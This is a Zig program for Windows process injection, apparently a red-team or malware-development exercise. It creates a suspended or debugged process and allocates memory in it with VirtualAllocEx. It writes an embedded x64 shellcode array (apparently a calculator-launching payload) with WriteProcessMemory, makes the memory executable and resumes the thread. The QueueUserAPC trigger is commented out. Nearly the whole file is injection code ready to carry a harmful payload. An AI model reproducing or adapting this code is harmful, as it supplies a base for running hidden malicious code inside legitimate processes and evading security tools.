const std = @import("std");
const win = std.os.windows;
const unicode = std.unicode;
const config = @import("config");

extern "kernel32" fn VirtualProtectEx(handle: win.HANDLE, lpAddress: ?win.LPVOID, dwSize: win.SIZE_T, flNewProtect: win.DWORD, lpflOldProtect: *win.DWORD) callconv(win.WINAPI) win.BOOL;

extern "kernel32" fn VirtualAllocEx(
    hProcess: win.HANDLE,
    lpAddress: ?*anyopaque,
    dwSize: usize,
    flAllocationType: win.DWORD,
    flProtect: win.DWORD,
) callconv(win.WINAPI) ?*anyopaque;

const VirtualProtectError = error{
    InvalidAddress,
    VirtualProtectFailed,
    UnexpectedStatus,
};

extern "kernel32" fn WriteProcessMemory(
    hProcess: win.HANDLE,
    lpBaseAddress: *anyopaque,
    lpBuffer: [*]const u8,
    nSize: usize,
    lpNumberOfBytesWritten: ?*usize,
) callconv(win.WINAPI) win.BOOL;

pub extern "kernel32" fn WaitForSingleObject(
    hHandle: win.HANDLE,
    dwMilliseconds: win.DWORD,
) callconv(win.WINAPI) win.DWORD;

extern "kernel32" fn CreateProcessW(
    lpApplicationName: ?win.LPCWSTR,
    lpCommandLine: ?win.LPWSTR,
    lpProcessAttributes: ?*win.SECURITY_ATTRIBUTES,
    lpThreadAttributes: ?*win.SECURITY_ATTRIBUTES,
    bInheritHandles: win.BOOL,
    dwCreationFlags: win.DWORD,
    lpEnvironment: ?win.LPVOID,
    lpCurrentDirectory: ?win.LPCWSTR,
    lpStartupInfo: *win.STARTUPINFOW,
    lpProcessInformation: *win.PROCESS_INFORMATION,
) callconv(win.WINAPI) win.BOOL;

extern "kernel32" fn ResumeThread(hThread: win.HANDLE) callconv(win.WINAPI) win.DWORD;

// Define CREATE_SUSPENDED constant manually
const CREATE_SUSPENDED: win.DWORD = 0x00000004;
const DEBUG_PROCESS: win.DWORD = 0x00000001;

pub fn main() !void {
    const shellcode = [_]u8{ 0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00 };

    // pass the build script into the main program
    const process_creation = config.createprocess;
    const process_name = config.processname;

    const options = [_][]const u8{
        "suspended",
        "debug",
    };

    // Create a general purpose allocator
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    const alloc = gpa.allocator();

    // Create UTF-16 command line for `notepad.exe`
    // const wide_cmd_line = try unicode.utf8ToUtf16LeAllocZ(alloc, "notepad.exe");
    const wide_cmd_line = try unicode.utf8ToUtf16LeAllocZ(alloc, process_name);

    // defer alloc.free(wide_cmd_line);

    // Initialize variables
    var hProcess: win.HANDLE = undefined;
    var hThread: win.HANDLE = undefined;
    const pProcess: *win.HANDLE = &hProcess;
    const pThread: *win.HANDLE = &hThread;
    const dwProcessId: *u32 = undefined;

    // Check the build option and call the appropriate function
    std.debug.print("[+] Launching process as: {s}\n", .{process_creation});
    std.debug.print("[+] Process name: {s}\n", .{process_name});

    if (@intFromBool(std.mem.eql(u8, process_creation, options[0])) == 1) {
        if (!CreateSuspendedProcess(CREATE_SUSPENDED, wide_cmd_line, dwProcessId, pProcess, pThread)) {
            std.debug.print("[+] Created suspended process failed.\n", .{});
            exit();
        }
    } else if (@intFromBool(std.mem.eql(u8, process_creation, options[1])) == 1) {
        std.debug.print("[+] Input type is debug\n", .{});
        if (!CreateSuspendedProcess(DEBUG_PROCESS, wide_cmd_line, dwProcessId, pProcess, pThread)) {
            std.debug.print("[+] CreateSuspendedProcess() failed.\n", .{});
            exit();
        }
    }

    std.debug.print("[+] CreateSuspendedProcess() succeeded.\n", .{});

    // Allocate memory in the remote process
    const remote_buffer = VirtualAllocEx(hProcess, null, shellcode.len, win.MEM_COMMIT | win.MEM_RESERVE, win.PAGE_READWRITE);
    if (remote_buffer == null) {
        std.debug.print("[+] VirtualAllocEx() failed.\n", .{});
        exit();
    }

    // Write the shellcode to the remote process
    var bytes_written: usize = 0;
    if (WriteProcessMemory(hProcess, remote_buffer.?, &shellcode, shellcode.len, &bytes_written) == win.FALSE) {
        std.debug.print("[+] WriteProcessMemory() failed.\n", .{});
        exit();
    }
    std.debug.print("[+] WriteProcessMemory() succeeded.\n", .{});

    // Change the memory protection of the remote buffer to executable
    var old_protect: win.DWORD = 0;
    if (VirtualProtectEx(hProcess, remote_buffer, shellcode.len, win.PAGE_EXECUTE_READ, &old_protect) == win.FALSE) {
        std.debug.print("[+] VirtualProtect() failed.\n", .{});
        exit();
    }
    std.debug.print("[+] VirtualProtect() succeeded.\n", .{});

    // Queue user APC time!!!
    // QueueUserAPC((PTHREAD_START_ROUTINE)remote_buffer, hThread, NULL);

    // Resume the thread
    _ = ResumeThread(hThread);

    // Hold the process open
    // _ = WaitForSingleObject(hProcess, win.INFINITE);
}

// pub fn InjectShellcodeToRemoteProcess(hProcess: *win.HANDLE, PBYTE pShellcode, SIZE_T shellcodeSize, *PVOID pAddress) bool {
//     // Allocate memory in the remote process
//     const remote_buffer = try VirtualAllocEx(hProcess, pAddress, shellcodeSize, win.MEM_COMMIT | win.MEM_RESERVE, win.PAGE_READWRITE);

//     // Write the shellcode to the remote process
//     var bytes_written: usize = 0;
//     if (WriteProcessMemory(hProcess, remote_buffer, pShellcode, shellcodeSize, &bytes_written) == win.FALSE) {
//         std.debug.print("[+] WriteProcessMemory() failed.\n", .{});
//         return false;
//     }
//     std.debug.print("[+] WriteProcessMemory() succeeded.\n", .{});

//     // Change the memory protection of the remote buffer to executable
//     var old_protect: win.DWORD = 0;
//     if (VirtualProtect(remote_buffer, shellcodeSize, win.PAGE_EXECUTE_READ, &old_protect) == win.FALSE) {
//         std.debug.print("[+] VirtualProtect() failed.\n", .{});
//         return false;
//     }
//     std.debug.print("[+] VirtualProtect() succeeded.\n", .{});

//     return true;
// }

pub fn CreateSuspendedProcess(dwCreationFlags: win.DWORD, lpProcessName: ?win.LPWSTR, dwProcessId: *u32, hProcess: *win.HANDLE, hThread: *win.HANDLE) bool {

    // Initialize structs
    var startup_info: win.STARTUPINFOW = std.mem.zeroes(win.STARTUPINFOW);
    var process_info: win.PROCESS_INFORMATION = std.mem.zeroes(win.PROCESS_INFORMATION);

    const result: win.BOOL = CreateProcessW(
        null,
        lpProcessName,
        null,
        null,
        win.FALSE,
        dwCreationFlags, // Use the manually defined constant
        null,
        null,
        &startup_info,
        &process_info,
    );
    if (result == win.FALSE) {
        std.debug.print("[+] CreateProcessW() failed.\n", .{});
        exit();
    }

    std.debug.print("[+] DONE\n", .{});

    // Populate the output parameters
    // dwProcessId.* = process_info.dwProcessId;
    _ = dwProcessId;
    hProcess.* = process_info.hProcess;
    hThread.* = process_info.hThread;

    // std.debug.print("[+] Printing Addresses.\n", .{});
    // std.debug.print("[+] ProcessHandle: {x}\n", .{@intFromPtr(&process_info.hProcess)});
    // std.debug.print("[+] ThreadHandle: {x}\n", .{@intFromPtr(&process_info.hThread)});

    // std.debug.print("[+] ProcessHandle: {x}\n", .{@intFromPtr(&hProcess)});
    // std.debug.print("[+] ThreadHandle: {x}\n", .{@intFromPtr(&hThread)});

    // std.debug.print("[+] Printing Handle Values.\n", .{});
    // std.debug.print("[+] ProcessHandle: {x}\n", .{@intFromPtr(process_info.hProcess)});
    // std.debug.print("[+] ThreadHandle: {x}\n", .{@intFromPtr(process_info.hThread)});

    // std.debug.print("[+] ProcessHandle: {x}\n", .{@intFromPtr(hProcess.*)});
    // std.debug.print("[+] ThreadHandle: {x}\n", .{@intFromPtr(hThread.*)});

    return true;
}

pub fn exit() noreturn {
    std.debug.print("Exiting...\n", .{});
    @import("std").process.exit(0);
}
